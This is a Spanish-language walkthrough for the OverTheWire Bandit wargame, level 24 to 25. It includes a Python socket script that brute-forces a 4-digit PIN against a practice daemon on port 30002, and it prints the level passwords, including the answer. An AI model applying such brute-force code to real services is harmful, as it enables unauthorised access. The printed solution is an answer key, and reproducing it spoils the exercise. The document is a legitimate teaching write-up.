# Y. **Bandit Level 24 → Level 25 - Walkthrough**

## **Objetivo del Nivel**
Un daemon está escuchando en el puerto **30002** y proporcionará la contraseña para `bandit25` si recibe la contraseña correcta de `bandit24` y un código PIN de 4 dígitos. No hay manera de obtener el PIN más que probando todas las combinaciones posibles, lo que significa que debemos hacer un **ataque de fuerza bruta**.

## **Conceptos Claves**
### **Fuerza Bruta**
Este método consiste en probar **todas** las combinaciones posibles hasta encontrar la correcta. En este caso, tenemos **10,000 combinaciones posibles** (`0000` a `9999`).

### **Sockets en Python**
Un **socket** es una forma de comunicación entre procesos a través de la red. En este reto, usaremos **sockets TCP** para comunicarnos con el daemon en `localhost` y enviar los intentos de PIN de manera continua sin cerrar la conexión.

---

## **Pasos para Resolver el Nivel**

### **1. Conectar a Bandit 24**
Inicia sesión con la contraseña obtenida en el nivel anterior.

```sh
ssh bandit24@bandit.labs.overthewire.org -p 2220
```

Cuando se solicite, ingresa la contraseña:

```sh
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

---

### **2. Crear el Script en /tmp**
Nos movemos a la carpeta `/tmp` (ya que no tenemos permisos de escritura en `~/`):

```sh
cd /tmp
```

Creamos un nuevo archivo llamado `bruteforce.py`:

```sh
nano bruteforce.py
```

Pega el siguiente código en el editor.

---

## **3. Código en Python para la Fuerza Bruta**
Este script intentará **todas las combinaciones de PIN** en una sola conexión sin necesidad de reconectarse en cada intento.

```python
#!/usr/bin/env python3
import socket
import time

# Configuración de la conexión
host = 'localhost'
port = 30002

# Contraseña de bandit24 (asegúrate de usar la correcta)
password = 'gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8'

# Crear socket TCP y conectar al daemon en el puerto 30002
s = socket.socket()
s.connect((host, port))

# Leer el banner inicial si lo hay
try:
    banner = s.recv(1024).decode('utf-8')
    print("Banner inicial:\n", banner)
except Exception:
    print("No se pudo leer el banner inicial.")

# Iterar sobre todos los posibles PINs (0000 - 9999)
for pin in range(10000):
    pin_str = f"{pin:04d}"  # Asegura que el PIN tenga 4 dígitos (ej: 0001, 0023)
    
    # Construir el mensaje: "contraseña PIN"
    mensaje = f"{password} {pin_str}\n"
    
    # Enviar el intento
    s.sendall(mensaje.encode())

    # Leer la respuesta
    try:
        respuesta = s.recv(1024).decode('utf-8')
    except Exception:
        print("Error al recibir respuesta.")
        break

    # Si encontramos la contraseña, la imprimimos y terminamos
    if "Password" in respuesta or "bandit25" in respuesta:
        print(f"¡PIN encontrado! PIN: {pin_str}")
        print("Respuesta del daemon:\n", respuesta)
        break
    else:
        print(f"Intento con PIN {pin_str} fallido.")



# Cerrar la conexión
s.close()
```

---

### **4. Dar Permisos de Ejecución**
Después de guardar el archivo (`CTRL + X`, luego `Y` y `Enter`), necesitamos darle permisos de ejecución:

```sh
chmod +x bruteforce.py
```

---

### **5. Ejecutar el Script**
Ahora podemos ejecutar el script y dejar que haga la fuerza bruta automáticamente:

```sh
./bruteforce.py
```

Este script probará **todas las combinaciones de PIN** (`0000` a `9999`) en una única conexión.

Cuando encuentre el PIN correcto, imprimirá algo como esto:

```sh
¡PIN encontrado! PIN: 9297

Respuesta del daemon:

 Correct!

The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```

Copiamos esta contraseña y la usamos para el siguiente nivel.

---

### **6. Conectar a Bandit 25**
```sh
ssh bandit25@bandit.labs.overthewire.org -p 2220
```

Cuando se solicite la contraseña, pegamos la que encontramos en el paso anterior.

---

## **Explicación del Código**
- **`socket.socket()`**: Crea una conexión TCP.
- **`s.connect((host, port))`**: Se conecta al puerto 30002 en `localhost`.
- **`s.sendall(mensaje.encode())`**: Envía la contraseña y el PIN al daemon.
- **`s.recv(1024).decode()`**: Recibe la respuesta del daemon.
- **`for pin in range(10000)`**: Itera desde `0000` hasta `9999` probando cada PIN.
- **`if "Password" in respuesta`**: Verifica si la respuesta contiene la contraseña de `bandit25`.

---

## **Conclusión**
Este método permite **encontrar el PIN correcto en menos de 1 minuto** sin necesidad de abrir múltiples conexiones. Si el script se interrumpe, puedes volver a ejecutarlo y comenzará desde `0000` nuevamente.

**¡Felicidades!** Has completado el nivel 24 y ahora puedes avanzar al nivel 25. 🚀